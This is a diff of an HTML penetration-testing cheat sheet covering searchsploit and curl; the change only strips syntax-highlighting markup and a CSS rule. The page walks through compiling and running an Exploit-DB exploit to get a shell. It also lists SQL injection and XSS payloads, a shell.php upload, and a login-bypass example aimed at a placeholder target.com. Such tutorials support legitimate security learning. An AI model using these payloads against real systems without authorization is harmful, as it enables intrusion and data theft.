@@ -87,17 +87,6 @@
         a:hover {
             text-decoration: underline;
         }
-        /* Force all syntax highlighting spans to black */
-        .codehilite pre span,
-        .codehilite pre span.c, .codehilite pre span.c1, .codehilite pre span.ch,
-        .codehilite pre span.k, .codehilite pre span.kd, .codehilite pre span.kr,
-        .codehilite pre span.m, .codehilite pre span.mi,
-        .codehilite pre span.n, .codehilite pre span.nb, .codehilite pre span.nc, .codehilite pre span.nf, .codehilite pre span.nv,
-        .codehilite pre span.o,
-        .codehilite pre span.p, .codehilite pre span.py,
-        .codehilite pre span.s, .codehilite pre span.s1, .codehilite pre span.s2, .codehilite pre span.se,
-        .codehilite pre span.w { color: #000000 !important; }
-        pre span { color: #000000 !important; }
         @media print {
             body { margin: 0; padding: 10px; }
             pre { page-break-inside: avoid; }
@@ -131,18 +120,18 @@
 <h3 id="cachyos-arch-linux">CachyOS (Arch Linux)</h3>
 
 <div class="codehilite">
-<pre><span></span><code>sudo<span class="w"> </span>pacman<span class="w"> </span>-S<span class="w"> </span>exploitdb
-searchsploit<span class="w"> </span>-h<span class="w">  </span><span class="c1"># Verify</span>
-which<span class="w"> </span>searchsploit
+<pre><code>sudo pacman -S exploitdb
+searchsploit -h  # Verify
+which searchsploit
 </code></pre>
 </div>
 
 <h3 id="update-local-database">Update Local Database</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Sync with latest exploits:</span>
-sudo<span class="w"> </span>searchsploit<span class="w"> </span>-u
-<span class="c1"># On first run, downloads ~50GB of exploits</span>
+<pre><code># Sync with latest exploits:
+sudo searchsploit -u
+# On first run, downloads ~50GB of exploits
 </code></pre>
 </div>
 
@@ -160,9 +149,9 @@ sudo<span class="w"> </span>searchsploit<span class="w"> </span>-u
 <h3 id="1-search-for-exploit-by-software-name">1. <strong>Search for Exploit by Software Name</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>searchsploit<span class="w"> </span>Apache<span class="w"> </span><span class="m">2</span>.4.6
-searchsploit<span class="w"> </span>Wordpress<span class="w"> </span><span class="m">5</span>.0
-searchsploit<span class="w"> </span>Tomcat<span class="w"> </span><span class="m">9</span>.0
+<pre><code>searchsploit Apache 2.4.6
+searchsploit Wordpress 5.0
+searchsploit Tomcat 9.0
 </code></pre>
 </div>
 
@@ -180,32 +169,32 @@ Apache mod_ssl 2.4.2 - Denial of Service         | linux/dos/16439.rb
 <h3 id="2-search-by-cve-id">2. <strong>Search by CVE ID</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>searchsploit<span class="w"> </span>CVE-2017-9822
-searchsploit<span class="w"> </span>CVE-2019-1010317
+<pre><code>searchsploit CVE-2017-9822
+searchsploit CVE-2019-1010317
 </code></pre>
 </div>
 
 <h3 id="3-filter-by-type">3. <strong>Filter by Type</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>searchsploit<span class="w"> </span>-t<span class="w"> </span>Apache<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;remote&quot;</span><span class="w">  </span><span class="c1"># Only remote exploits</span>
-searchsploit<span class="w"> </span>-t<span class="w"> </span>Apache<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;local&quot;</span><span class="w">   </span><span class="c1"># Only local exploits</span>
+<pre><code>searchsploit -t Apache | grep &quot;remote&quot;  # Only remote exploits
+searchsploit -t Apache | grep &quot;local&quot;   # Only local exploits
 </code></pre>
 </div>
 
 <h3 id="4-exclude-terms">4. <strong>Exclude Terms</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>searchsploit<span class="w"> </span>Apache<span class="w"> </span>-e<span class="w"> </span>Denial<span class="w">  </span><span class="c1"># Exclude Denial of Service</span>
-searchsploit<span class="w"> </span>--exclude<span class="o">=</span><span class="s2">&quot;dos&quot;</span>
+<pre><code>searchsploit Apache -e Denial  # Exclude Denial of Service
+searchsploit --exclude=&quot;dos&quot;
 </code></pre>
 </div>
 
 <h3 id="5-copy-exploit-to-current-directory">5. <strong>Copy Exploit to Current Directory</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>searchsploit<span class="w"> </span>-p<span class="w"> </span><span class="m">24659</span><span class="w">  </span><span class="c1"># Shows path to exploit</span>
-searchsploit<span class="w"> </span>-p<span class="w"> </span><span class="m">24659</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;\n&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xargs<span class="w"> </span>-I<span class="w"> </span><span class="o">{}</span><span class="w"> </span>cp<span class="w"> </span><span class="o">{}</span><span class="w"> </span>.
+<pre><code>searchsploit -p 24659  # Shows path to exploit
+searchsploit -p 24659 | tr -d &#39;\n&#39; | xargs -I {} cp {} .
 </code></pre>
 </div>
 
@@ -215,22 +204,22 @@ searchsploit<span class="w"> </span>-p<span class="w"> </span><span class="m">24
 <h3 id="6-view-exploit-details">6. <strong>View Exploit Details</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>searchsploit<span class="w"> </span>-x<span class="w"> </span><span class="m">24659</span>
-<span class="c1"># Opens exploit code in text viewer</span>
+<pre><code>searchsploit -x 24659
+# Opens exploit code in text viewer
 </code></pre>
 </div>
 
 <h3 id="7-case-insensitive-search">7. <strong>Case-Insensitive Search</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>searchsploit<span class="w"> </span>-i<span class="w"> </span>apache<span class="w">  </span><span class="c1"># Lowercase a</span>
+<pre><code>searchsploit -i apache  # Lowercase a
 </code></pre>
 </div>
 
 <h3 id="8-update-database">8. <strong>Update Database</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>sudo<span class="w"> </span>searchsploit<span class="w"> </span>-u
+<pre><code>sudo searchsploit -u
 </code></pre>
 </div>
 
@@ -241,28 +230,28 @@ searchsploit<span class="w"> </span>-p<span class="w"> </span><span class="m">24
 <h3 id="complete-exploitation-path">Complete Exploitation Path</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Step 1: Identify software version with nmap</span>
-nmap<span class="w"> </span>-sV<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span>
+<pre><code># Step 1: Identify software version with nmap
+nmap -sV 192.168.1.100 -p 80
 
-<span class="c1"># Output: Apache/2.4.6</span>
+# Output: Apache/2.4.6
 
-<span class="c1"># Step 2: Search for exploits</span>
-searchsploit<span class="w"> </span>Apache<span class="w"> </span><span class="m">2</span>.4.6
+# Step 2: Search for exploits
+searchsploit Apache 2.4.6
 
-<span class="c1"># Step 3: Review available exploits</span>
-<span class="c1"># Choose one that seems viable</span>
+# Step 3: Review available exploits
+# Choose one that seems viable
 
-<span class="c1"># Step 4: Copy exploit to working directory</span>
-searchsploit<span class="w"> </span>-p<span class="w"> </span><span class="m">24659</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xargs<span class="w"> </span>-I<span class="w"> </span><span class="o">{}</span><span class="w"> </span>cp<span class="w"> </span><span class="o">{}</span><span class="w"> </span>.
+# Step 4: Copy exploit to working directory
+searchsploit -p 24659 | xargs -I {} cp {} .
 
-<span class="c1"># Step 5: Examine exploit code</span>
-cat<span class="w"> </span><span class="m">24659</span>.c
-<span class="c1"># or</span>
-searchsploit<span class="w"> </span>-x<span class="w"> </span><span class="m">24659</span>
+# Step 5: Examine exploit code
+cat 24659.c
+# or
+searchsploit -x 24659
 
-<span class="c1"># Step 6: Compile/run exploit</span>
-gcc<span class="w"> </span><span class="m">24659</span>.c<span class="w"> </span>-o<span class="w"> </span>exploit
-./exploit<span class="w"> </span><span class="m">192</span>.168.1.100
+# Step 6: Compile/run exploit
+gcc 24659.c -o exploit
+./exploit 192.168.1.100
 </code></pre>
 </div>
 
@@ -271,21 +260,21 @@ gcc<span class="w"> </span><span class="m">24659</span>.c<span class="w"> </span
 <h2 id="real-world-example">Real-World Example</h2>
 
 <div class="codehilite">
-<pre><span></span><code>$<span class="w"> </span>searchsploit<span class="w"> </span>Apache<span class="w"> </span><span class="m">2</span>.4.6
-<span class="w">  </span>Exploit<span class="w"> </span>Title<span class="w">                                    </span><span class="p">|</span><span class="w">  </span>Path
-<span class="w">  </span>------------------------------------------------<span class="w"> </span><span class="p">|</span><span class="w"> </span>---------
-<span class="w">  </span>Apache<span class="w"> </span><span class="m">2</span>.4.6<span class="w"> </span>-<span class="w"> </span>CVE-2013-6438<span class="w"> </span>-<span class="w"> </span>Heap<span class="w"> </span>Overflow<span class="w">   </span><span class="p">|</span><span class="w"> </span>linux/remote/24659.c
+<pre><code>$ searchsploit Apache 2.4.6
+  Exploit Title                                    |  Path
+  ------------------------------------------------ | ---------
+  Apache 2.4.6 - CVE-2013-6438 - Heap Overflow   | linux/remote/24659.c
 
-$<span class="w"> </span>searchsploit<span class="w"> </span>-p<span class="w"> </span><span class="m">24659</span>
-<span class="w">  </span>Path:<span class="w"> </span>/usr/share/exploitdb/exploits/linux/remote/24659.c
+$ searchsploit -p 24659
+  Path: /usr/share/exploitdb/exploits/linux/remote/24659.c
 
-$<span class="w"> </span>cat<span class="w"> </span>/usr/share/exploitdb/exploits/linux/remote/24659.c
-<span class="w">  </span>//<span class="w"> </span>Exploit<span class="w"> </span>code<span class="w"> </span>here...
+$ cat /usr/share/exploitdb/exploits/linux/remote/24659.c
+  // Exploit code here...
 
-$<span class="w"> </span>gcc<span class="w"> </span><span class="m">24659</span>.c<span class="w"> </span>-o<span class="w"> </span>apache_exploit
-$<span class="w"> </span>./apache_exploit<span class="w"> </span><span class="m">192</span>.168.1.100
-<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Attempting<span class="w"> </span>exploit...
-<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Shell<span class="w"> </span>obtained!
+$ gcc 24659.c -o apache_exploit
+$ ./apache_exploit 192.168.1.100
+  [+] Attempting exploit...
+  [+] Shell obtained!
 </code></pre>
 </div>
 
@@ -331,8 +320,8 @@ $<span class="w"> </span>./apache_exploit<span class="w"> </span><span class="m"
 <h3 id="cachyos-arch-linux-2">CachyOS (Arch Linux)</h3>
 
 <div class="codehilite">
-<pre><span></span><code>sudo<span class="w"> </span>pacman<span class="w"> </span>-S<span class="w"> </span>curl
-curl<span class="w"> </span>--version<span class="w">  </span><span class="c1"># Verify</span>
+<pre><code>sudo pacman -S curl
+curl --version  # Verify
 </code></pre>
 </div>
 
@@ -350,15 +339,15 @@ curl<span class="w"> </span>--version<span class="w">  </span><span class="c1">#
 <h3 id="1-basic-get-request">1. <strong>Basic GET Request</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>curl<span class="w"> </span>http://target.com
-curl<span class="w"> </span>-v<span class="w"> </span>http://target.com<span class="w">  </span><span class="c1"># Verbose (see headers)</span>
+<pre><code>curl http://target.com
+curl -v http://target.com  # Verbose (see headers)
 </code></pre>
 </div>
 
 <h3 id="2-head-request-headers-only">2. <strong>HEAD Request (Headers Only)</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>curl<span class="w"> </span>-I<span class="w"> </span>http://target.com
+<pre><code>curl -I http://target.com
 </code></pre>
 </div>
 
@@ -371,105 +360,105 @@ curl<span class="w"> </span>-v<span class="w"> </span>http://target.com<span cla
 <h3 id="3-post-request-with-data">3. <strong>POST Request with Data</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;username=admin&amp;password=pass&quot;</span><span class="w"> </span>http://target.com/login
-curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>--data<span class="w"> </span><span class="s2">&quot;id=1&quot;</span><span class="w"> </span>http://target.com/search
+<pre><code>curl -X POST -d &quot;username=admin&amp;password=pass&quot; http://target.com/login
+curl -X POST --data &quot;id=1&quot; http://target.com/search
 </code></pre>
 </div>
 
 <h3 id="4-send-custom-headers">4. <strong>Send Custom Headers</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;User-Agent: Mozilla/5.0&quot;</span><span class="w"> </span>http://target.com
-curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer TOKEN&quot;</span><span class="w"> </span>http://target.com/api
+<pre><code>curl -H &quot;User-Agent: Mozilla/5.0&quot; http://target.com
+curl -H &quot;Authorization: Bearer TOKEN&quot; http://target.com/api
 </code></pre>
 </div>
 
 <h3 id="5-authentication">5. <strong>Authentication</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>curl<span class="w"> </span>-u<span class="w"> </span>username:password<span class="w"> </span>http://target.com
-curl<span class="w"> </span>--digest<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>http://target.com
+<pre><code>curl -u username:password http://target.com
+curl --digest -u user:pass http://target.com
 </code></pre>
 </div>
 
 <h3 id="6-cookies">6. <strong>Cookies</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>curl<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;session=abc123&quot;</span><span class="w"> </span>http://target.com
-curl<span class="w"> </span>-c<span class="w"> </span>cookies.txt<span class="w"> </span>http://target.com<span class="w">  </span><span class="c1"># Save cookies</span>
-curl<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span>http://target.com<span class="w">  </span><span class="c1"># Send saved cookies</span>
+<pre><code>curl -b &quot;session=abc123&quot; http://target.com
+curl -c cookies.txt http://target.com  # Save cookies
+curl -b cookies.txt http://target.com  # Send saved cookies
 </code></pre>
 </div>
 
 <h3 id="7-follow-redirects">7. <strong>Follow Redirects</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>curl<span class="w"> </span>-L<span class="w"> </span>http://target.com
+<pre><code>curl -L http://target.com
 </code></pre>
 </div>
 
 <h3 id="8-test-sql-injection">8. <strong>Test SQL Injection</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>curl<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=1&#39; OR &#39;1&#39;=&#39;1&quot;</span>
-curl<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=1 UNION SELECT NULL--&quot;</span>
+<pre><code>curl &quot;http://target.com/page?id=1&#39; OR &#39;1&#39;=&#39;1&quot;
+curl &quot;http://target.com/page?id=1 UNION SELECT NULL--&quot;
 </code></pre>
 </div>
 
 <h3 id="9-upload-file">9. <strong>Upload File</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>curl<span class="w"> </span>-F<span class="w"> </span><span class="s2">&quot;file=@shell.php&quot;</span><span class="w"> </span>http://target.com/upload
+<pre><code>curl -F &quot;file=@shell.php&quot; http://target.com/upload
 </code></pre>
 </div>
 
 <h3 id="10-send-json">10. <strong>Send JSON</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;pass&quot;}&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>http://target.com/api/login
+<pre><code>curl -X POST -H &quot;Content-Type: application/json&quot; \
+  -d &#39;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;pass&quot;}&#39; \
+  http://target.com/api/login
 </code></pre>
 </div>
 
 <h3 id="11-proxy-request">11. <strong>Proxy Request</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>curl<span class="w"> </span>-x<span class="w"> </span>http://proxy:8080<span class="w"> </span>http://target.com
-curl<span class="w"> </span>-x<span class="w"> </span>http://user:pass@proxy:8080<span class="w"> </span>http://target.com
+<pre><code>curl -x http://proxy:8080 http://target.com
+curl -x http://user:pass@proxy:8080 http://target.com
 </code></pre>
 </div>
 
 <h3 id="12-ssltls-certificate-issues">12. <strong>SSL/TLS Certificate Issues</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>curl<span class="w"> </span>-k<span class="w"> </span>https://target.com<span class="w">  </span><span class="c1"># Skip certificate validation</span>
+<pre><code>curl -k https://target.com  # Skip certificate validation
 </code></pre>
 </div>
 
 <h3 id="13-save-output">13. <strong>Save Output</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>curl<span class="w"> </span>http://target.com<span class="w"> </span>-o<span class="w"> </span>output.html
-curl<span class="w"> </span>http://target.com<span class="w"> </span>&gt;<span class="w"> </span>output.html
+<pre><code>curl http://target.com -o output.html
+curl http://target.com &gt; output.html
 </code></pre>
 </div>
 
 <h3 id="14-resume-download">14. <strong>Resume Download</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>curl<span class="w"> </span>-C<span class="w"> </span>-<span class="w"> </span>-o<span class="w"> </span>file.zip<span class="w"> </span>http://target.com/file.zip
+<pre><code>curl -C - -o file.zip http://target.com/file.zip
 </code></pre>
 </div>
 
 <h3 id="15-batch-testing">15. <strong>Batch Testing</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Test multiple endpoints:</span>
-<span class="k">for</span><span class="w"> </span>endpoint<span class="w"> </span><span class="k">in</span><span class="w"> </span>/admin<span class="w"> </span>/login<span class="w"> </span>/api/users<span class="w"> </span>/backdoor<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Testing </span><span class="nv">$endpoint</span><span class="s2">:&quot;</span>
-<span class="w">  </span>curl<span class="w"> </span>-I<span class="w"> </span>http://target.com<span class="nv">$endpoint</span>
-<span class="k">done</span>
+<pre><code># Test multiple endpoints:
+for endpoint in /admin /login /api/users /backdoor; do
+  echo &quot;Testing $endpoint:&quot;
+  curl -I http://target.com$endpoint
+done
 </code></pre>
 </div>
 
@@ -480,25 +469,25 @@ curl<span class="w"> </span>http://target.com<span class="w"> </span>&gt;<span c
 <h3 id="test-web-application-manually">Test Web Application Manually</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Step 1: Basic page retrieval</span>
-curl<span class="w"> </span>-v<span class="w"> </span>http://target.com/page
+<pre><code># Step 1: Basic page retrieval
+curl -v http://target.com/page
 
-<span class="c1"># Step 2: Check headers for info</span>
-curl<span class="w"> </span>-I<span class="w"> </span>http://target.com
+# Step 2: Check headers for info
+curl -I http://target.com
 
-<span class="c1"># Step 3: Test for SQL injection</span>
-curl<span class="w"> </span><span class="s2">&quot;http://target.com/search?q=1&#39; OR &#39;1&#39;=&#39;1&quot;</span>
+# Step 3: Test for SQL injection
+curl &quot;http://target.com/search?q=1&#39; OR &#39;1&#39;=&#39;1&quot;
 
-<span class="c1"># Step 4: Try authentication bypass</span>
-curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;username=admin&amp;password=test&quot;</span><span class="w"> </span>http://target.com/login
+# Step 4: Try authentication bypass
+curl -X POST -d &quot;username=admin&amp;password=test&quot; http://target.com/login
 
-<span class="c1"># Step 5: Send malicious input</span>
-curl<span class="w"> </span><span class="s2">&quot;http://target.com/search?q=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;</span>
+# Step 5: Send malicious input
+curl &quot;http://target.com/search?q=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;
 
-<span class="c1"># Step 6: API enumeration</span>
-curl<span class="w"> </span>http://target.com/api/v1/users
-curl<span class="w"> </span>http://target.com/api/v1/admin
-curl<span class="w"> </span>http://target.com/api/v2/config
+# Step 6: API enumeration
+curl http://target.com/api/v1/users
+curl http://target.com/api/v1/admin
+curl http://target.com/api/v2/config
 </code></pre>
 </div>
 
@@ -507,12 +496,12 @@ curl<span class="w"> </span>http://target.com/api/v2/config
 <h2 id="real-world-example-2">Real-World Example</h2>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Test login form for SQL injection:</span>
-$<span class="w"> </span>curl<span class="w"> </span>-v<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;user=admin&#39; OR &#39;1&#39;=&#39;1&amp;pass=test&quot;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>http://target.com/login
+<pre><code># Test login form for SQL injection:
+$ curl -v -X POST -d &quot;user=admin&#39; OR &#39;1&#39;=&#39;1&amp;pass=test&quot; \
+  http://target.com/login
 
-<span class="c1"># Response shows 200 OK (login bypassed!)</span>
-<span class="c1"># Next step: Upload shell or access admin panel</span>
+# Response shows 200 OK (login bypassed!)
+# Next step: Upload shell or access admin panel
 </code></pre>
 </div>
 
